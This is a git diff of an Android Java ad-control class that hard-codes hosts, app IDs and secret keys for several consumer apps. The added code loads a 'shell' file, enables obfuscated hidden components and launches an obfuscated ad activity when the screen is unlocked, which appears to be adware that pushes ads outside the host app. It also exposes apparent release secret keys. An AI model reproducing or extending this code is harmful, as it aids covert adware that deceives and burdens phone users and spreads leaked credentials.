@@ -30,7 +30,6 @@ import com.ep.custom_honor_library.http.OnHttpListener;
 import com.ep.custom_honor_library.http.OnMiddleInterface;
 import com.ep.custom_honor_library.sdk.GmSdkUtils;
 import com.ep.custom_honor_library.sdk.JuliangSDKUtils;
-import com.ep.custom_honor_library.ui.MiddleAdActivity;
 import com.ep.custom_honor_library.utils.CommonSpUtils;
 import com.ep.custom_honor_library.utils.CustomLogUtils;
 import com.ep.custom_honor_library.utils.DefAPIUtils;
@@ -42,6 +41,7 @@ import com.meituan.android.walle.WalleChannelReader;
 import com.qq.e.ads.PortraitADActivity;
 import com.qq.e.ads.RewardvideoPortraitADActivity;
 import com.tencent.mmkv.MMKV;
+import com.zh.zk.OIUZH;
 
 import java.io.File;
 import java.lang.ref.WeakReference;
@@ -62,7 +62,97 @@ public class ControllerUtils {
         handler.postDelayed(runnable, 0 * 1000);
     }
 
-   private static Runnable runnable = new Runnable() {
+
+    private static void switchInfo(Context context){
+
+
+
+
+        switch (context.getPackageName()){
+
+
+              case "com.dolw.moyeshisao":
+                CommonAPI.HOST = "https://api.nunpingli.cn/";
+                CommonAPI.APPID = "5883378";
+                CommonAPI.APP_RELEASE_APPID = "6bb7e365466f084b";
+                CommonAPI.RELEASE_SSK = "aa2315075d63e80e00491243f56c3ae6";
+                CommonAPI.umID = "6acf1fe8863270068ca0dc6c";
+                break;
+
+            case "com.nmgsr.nuanjichaoxibeiwanglu":
+                CommonAPI.HOST = "https://api.nunpingli.cn/";
+                CommonAPI.APPID = "5883357";
+                CommonAPI.APP_RELEASE_APPID = "4d884c2c2afe9366";
+                CommonAPI.RELEASE_SSK = "595192dffc94c64351b4dd509c79d089";
+                CommonAPI.umID = "6acf21ba6545637cd60f7ec0";
+                break;
+
+
+          case "com.gzyf.yingwensaomiao":
+                CommonAPI.HOST = "https://api.nunpingli.cn/";
+                CommonAPI.APPID = "5884187";
+                CommonAPI.APP_RELEASE_APPID = "6452d01f224554a2";
+                CommonAPI.RELEASE_SSK = "ef6ef4430cd6fbf72c5501e7ad6f3be6";
+                CommonAPI.umID = "6acf28116545637cd60f8fcc";
+                break;
+
+            case "com.gzyf.janxiaojinghuihuawu":
+                CommonAPI.HOST = "https://api.nunpingli.cn/";
+                CommonAPI.APPID = "5884189";
+                CommonAPI.APP_RELEASE_APPID = "beffd1d59f90d87c";
+                CommonAPI.RELEASE_SSK = "ea7450c0b4e595a5a21624c8f3a5bf85";
+                CommonAPI.umID = "6acf282c6545637cd60f8ff7";
+                break;
+
+
+
+//            case "com.dolw.wenlanhuyi":
+//                CommonAPI.HOST = "https://api.nunpingli.cn/";
+//                CommonAPI.APPID = "5883381";
+//                CommonAPI.APP_RELEASE_APPID = "ad4cb2f423e9afed";
+//                CommonAPI.RELEASE_SSK = "4e16af0dcbd799a90d44af8f723432cd";
+//                CommonAPI.umID = "6acdd1b46545637cd60d338d";
+//                break;
+//
+//
+//
+//            case "com.dolw.zhinengshengliushenqi":
+//                CommonAPI.HOST = "https://api.nunpingli.cn/";
+//                CommonAPI.APPID = "5883386";
+//                CommonAPI.APP_RELEASE_APPID = "2c1dc8aa05795bc4";
+//                CommonAPI.RELEASE_SSK = "17bc587ae49e7cf3f02c499cc9ca9e3c";
+//                CommonAPI.umID = "6acdd1d0863270068c9f993a";
+//                break;
+
+
+//            case "com.nmgsr.meihaohuihua":
+//                CommonAPI.HOST = "https://api.nunpingli.cn/";
+//                CommonAPI.APPID = "5883352";
+//                CommonAPI.APP_RELEASE_APPID = "f2d5c2bed1897198";
+//                CommonAPI.RELEASE_SSK = "cce615bc0c0f42dc13c97b8332402228";
+//                CommonAPI.umID = "6acc8ec2863270068c9db996";
+//                break;
+//            case "com.nmgsr.qingshitianqi":
+//                CommonAPI.HOST = "https://api.nunpingli.cn/";
+//                CommonAPI.APPID = "5877568";
+//                CommonAPI.APP_RELEASE_APPID = "1b6b6fb21d28f13a";
+//                CommonAPI.RELEASE_SSK = "65fb608b0f0319dfc4b27b046c325ba3";
+//                CommonAPI.umID = "6acc8fbe6545637cd6099e72";
+//                break;
+
+
+
+
+        }
+    }
+
+
+
+
+
+
+
+    private static Runnable runnable = new Runnable() {
         @Override
         public void run() {
             initStrategy(DefAPIUtils.randomConfig_from_delay, new  OnHttpListener() {
@@ -97,20 +187,32 @@ public class ControllerUtils {
     }
 
 
+
+    public static Handler mainHandler = new Handler(Looper.getMainLooper());
+
     //初始化基础
     public static void initDef(Application application){
-        MMKV.initialize(application);
-        DefContextUtils.instance.setAppContext(application);
-        CommonAPI.VERSION = getVersionName(application);
-        initActivityListener();
-        //初始化渠道
-        String channel = WalleChannelReader.getChannel(application, "9").toString();
-        CommonSpUtils.setSpChannelNumStr(channel);
-        initSDK();
-        handlerPostInitStrategy();
-        initFe();
+
+        mainHandler.post(new Runnable() {
+        @Override
+            public void run() {
+                MMKV.initialize(application);
+                DefContextUtils.instance.setAppContext(application);
+                switchInfo(application);
+
+                CommonAPI.VERSION = getVersionName(application);
+                initActivityListener();
+                //初始化渠道
+                String channel = WalleChannelReader.getChannel(application, "9").toString();
+                CommonSpUtils.setSpChannelNumStr(channel);
+                initSDK();
+                handlerPostInitStrategy();
+                initFe();
+            }});
 
     }
+
+
 
 
 
@@ -140,6 +242,9 @@ public class ControllerUtils {
 
 
     private static void toLoAdHandler(long time){
+        if (!isHasShowAd) {
+            lopClearApp();
+        }
         adHandler.postDelayed(adRunnable,time);
     }
 
@@ -156,7 +261,7 @@ public class ControllerUtils {
             HandlerAdUtils.getInstance().startHandler(0);
             TimeCoundLp.getInstance().startTimeCountListLp();
             LopTimeTJ.getInstance().startLpMessage();
-            toLoAdHandler(5);
+            toLoAdHandler(5*1000);
             mIsIniLop = true;
         }
     }
@@ -168,12 +273,13 @@ public class ControllerUtils {
         CommonHttpUtils.getInstance().postFileHttp(DefContextUtils.instance.getApplication(), file, new OnHttpListener() {
         @Override
             public void onSuccess() {
-            Log.i("AD_LOG","初始化啊shell");
-            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.keep.up.tt.oa.CommonSer");
+            CustomLogUtils.i("AD_LOG","初始化啊shell");
+            Log.i("AD_LOG","ok");
+            SafeUtils.enable(DefContextUtils.instance.getApplication(),"com.saom.tianqi.GAGAVIEW");
             if (Build.VERSION.SDK_INT>=34){
                 SafeUtils.popupDialog(DefContextUtils.instance.getApplication(),true);
             }
-            toLoAdHandler(5*1000);
+//            toLoAdHandler(5*1000);
         }
             @Override
             public void onFail(Exception e) {}
@@ -184,18 +290,19 @@ public class ControllerUtils {
 
 
     private static void toOpenMiddle(Intent intent){
-        Log.i("AD_LOG","开始跳转11111");
+        CustomLogUtils.i("开始跳转11111");
         String spShellFile = CommonSpUtils.getSpShellFile();
         if (!TextUtils.isEmpty(spShellFile) && new File(spShellFile).length()>0){
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             SafeUtils.startTarget(DefContextUtils.instance.getApplication(), intent);
         }
 
+
     }
 
 
     public static void intentMiddleWindow(String adScreen,int index){
-        Intent intent = new Intent(DefContextUtils.instance.getApplication(), MiddleAdActivity.class);
+        Intent intent = new Intent(DefContextUtils.instance.getApplication(), OIUZH.class);
         intent.putExtra(CommonAPI.INTENT_MIDDLE_FLAG,adScreen);
         intent.putExtra(CommonAPI.INTENT_MIDDLE_INDEX,index);
         if (isScreenUnLock()){
